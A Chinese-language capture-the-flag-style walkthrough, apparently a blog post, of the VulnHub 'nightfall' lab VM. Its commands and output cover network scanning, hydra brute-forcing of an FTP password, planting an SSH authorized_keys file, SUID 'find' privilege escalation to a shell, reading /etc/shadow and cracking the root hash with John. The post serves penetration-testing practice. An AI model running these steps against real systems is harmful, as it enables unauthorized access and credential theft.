---
title: nightfall渗透测试
date: 2019-09-10 19:03:41
tags:
 - hack
 - security
---

# 背景知识
1. [什么是SAMBA](https://www.ctolib.com/docs/sfile/vbird-linux-server-3e/114.html)
2. [enum4linux](https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/)
3. [uid之ruid，euid，suid](https://cysecguide.blogspot.com/2016/10/difference-among-ruid-euid-suid.html)
    - https://brucechen7.github.io/2014/11/14/2014-11-14-euid-ruid-euid/
    - https://unix.stackexchange.com/questions/191940/difference-between-owner-root-and-ruid-euid
    - https://www.jianshu.com/p/23f2f2be2b29
    - https://www.cnblogs.com/limingluzhu/p/5702486.html
    - https://www.anquanke.com/post/id/86979 (推荐)
4. [/etc/passwd和/etc/shadow的区别](http://www.chinastor.com/os/linux/092034W22016.html)

# 攻击步骤
1. 发现主机
```
# netdiscover
Currently scanning: 172.26.118.0/16   |   Screen View: Unique Hosts                                                                                                                                                                                                           
 244 Captured ARP Req/Rep packets, from 27 hosts.   Total size: 14100                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.188.14.179   08:00:27:5a:52:6b    108    6480  PCS Systemtechnik GmbH                                                                      
 10.188.144.178  14:ab:c5:9f:29:5f     18    1008  Intel Corporate                                                                             
 10.188.88.79    30:3a:64:f6:b4:40     21    1176  Intel Corporate                                                                       
```
2. 扫描端口, 发现可用ftp服务
```
# nmap -A xx.xxx.xx.x
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-10 15:36 EDT
Nmap scan report for 10.188.14.179
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.188.14.179:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, Speaks41ProtocolOld, FoundRows, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, InteractiveClient, IgnoreSigpipes, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: *eBUf$|gmnay^K<,f<;S
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:5A:52:6B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: NIGHTFALL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: nightfall
|   NetBIOS computer name: NIGHTFALL\x00
|   Domain name: nightfall
|   FQDN: nightfall.nightfall
|_  System time: 2019-09-10T15:36:37-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-10T19:36:37
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 10.188.14.179

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.43 seconds
```
3. 发掘系统的信息
```
enum4linux xx.xx.xx.x
```
4. 暴力破解ftp密码
```
hydra -l matt -P /usr/share/wordlists/rockyou.txt xx.xx.xx.xx ftp -e nsr
```
5. 破解得到用户`matt`的密码为`cheese`, 用其登录ftp
6. 创建`~/.ssh`文件夹
```
ftp> mkdir .ssh
```
6. 本地创建ssh的key并将`id_rsa.pub`复制一份重命名为`authorized_keys`
```
ssh-keygen
cp ~/.ssh/id_rsa.pub ~/authorized_keys
```
8. nightfall上使用ftp上传本地的`~/.ssh/id_rsa.pub`到nightfall的新创建的`~/.ssh`文件夹下
```
ftp>cd .ssh
ftp>put authorized_keys
```
9. 直接登录matt账号
```
ssh matt@xx.xx.xxx.x
```
10. 查找具有SUID权限的文件
```
find / -perm -u=s -type f 2>/dev/null
```
11. 运行类find命令提权
```
cd /scripts
./find . -exec /bin/sh -p \; -quit
```
12. nightfall家目录下创建.ssh文件夹, 类似上传`authorized_keys`文件, 然后ssh登录nightfall账号
13. 读取shadow文件中的加密密码
```
sudo -u root cat /etc/shadow
```
14. 将root的**加密密码**复制到本地`pwd.txt`文件并使用john the ripper来破解密码
```
john pwd.txt
```
15. 使用找到的密码登录root破解完成

参考链接
1. [nightfall VM download](https://www.vulnhub.com/entry/sunset-nightfall,355/)
1. https://www.hackingarticles.in/sunset-nightfall-vulnhub-walkthrough/

some other notes
```
nmap -sP -n -oX results.txt 10.188.1.1/16
grep -Eo 'addr=".*?" addrtype="ipv4"' results.txt | awk -F '"' '{print $2}' > ips.txt
nmap -sS -O -A -oX details.txt -iL ips.txt
```